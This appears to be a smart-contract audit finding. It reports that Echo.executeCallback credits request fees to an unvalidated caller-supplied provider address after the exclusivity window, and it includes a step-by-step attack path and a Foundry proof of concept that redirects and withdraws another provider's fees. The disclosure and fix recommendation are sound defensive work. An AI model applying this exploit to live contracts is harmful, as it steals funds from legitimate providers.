### Title
Unauthenticated `providerToCredit` in `Echo.executeCallback` Allows Fee Theft After Exclusivity Period - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

### Summary

`Echo.executeCallback` accepts a caller-supplied `providerToCredit` address and credits the entire request fee to it with no validation that the address is the legitimate assigned provider. After the exclusivity window expires, any registered attacker can call `executeCallback` with their own address as `providerToCredit`, stealing the fees that were paid by the user to the legitimate provider.

### Finding Description

`Echo.executeCallback` is a public, unauthenticated function. Its only access control is an exclusivity-period check that enforces `providerToCredit == req.provider` only while `block.timestamp < req.publishTime + exclusivityPeriodSeconds`. Once that window closes, the check is skipped entirely:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
```

After the exclusivity period, the function unconditionally credits the full request fee to the caller-supplied `providerToCredit`:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

`req.fee` is the provider compensation paid by the user at request time (`msg.value - pythFeeInWei`). There is no check that `providerToCredit` is the assigned provider, or even a registered provider.

**Concrete attack path:**

1. Attacker calls `registerProvider(0, 0, 0)` — free, no cost.
2. Attacker calls `setFeeManager(attackerAddress)` to set themselves as their own fee manager.
3. A legitimate user submits a request via `requestPriceUpdatesWithCallback`, paying fees intended for `defaultProvider`.
4. Attacker waits for `block.timestamp >= req.publishTime + exclusivityPeriodSeconds`.
5. Attacker calls `executeCallback(attackerAddress, sequenceNumber, validUpdateData, priceIds)` — supplying valid Pyth update data (publicly available).
6. `req.fee` (the legitimate provider's compensation) is credited to `_state.providers[attackerAddress].accruedFeesInWei`.
7. Attacker calls `withdrawAsFeeManager(attackerAddress, stolenAmount)` to drain the funds.

The legitimate provider receives nothing despite the request being fulfilled.

### Impact Explanation

Direct financial loss to legitimate Echo providers: every request whose exclusivity period expires before the assigned provider fulfills it can have its fee stolen by any registered attacker. Since `registerProvider` is free and permissionless, the barrier to entry is zero. The stolen amount equals `req.fee = msg.value - pythFeeInWei` per request, which scales with the `callbackGasLimit` and provider fee rates set at request time.

### Likelihood Explanation

High. `registerProvider` is open to anyone at no cost. The attacker only needs to monitor on-chain requests and act after the exclusivity window. The valid `updateData` required by `parsePriceFeedUpdates` is publicly available from Pyth's price service. The attack is fully automatable and requires no privileged access.

### Recommendation

Validate that `providerToCredit` equals `req.provider` unconditionally, not only during the exclusivity period. If the design intent is to allow any provider to fulfill after exclusivity expires (as a fallback), then `providerToCredit` should still be restricted to registered providers, and a penalty/redistribution mechanism should be implemented to compensate the originally assigned provider rather than allowing arbitrary fee redirection.

### Proof of Concept

```solidity
// 1. Attacker registers as provider (free)
vm.prank(attacker);
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);

// 3. Legitimate user submits request to defaultProvider
vm.deal(user, 1 ether);
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: fee}(
    defaultProvider, publishTime, priceIds, callbackGasLimit
);

// 4. Wait for exclusivity period to expire
vm.warp(publishTime + exclusivityPeriodSeconds + 1);

// 5. Attacker calls executeCallback crediting themselves
vm.prank(attacker);
echo.executeCallback(attacker, seq, validUpdateData, priceIds);

// 6. Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);
// attacker now holds the fees that were meant for defaultProvider
```

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
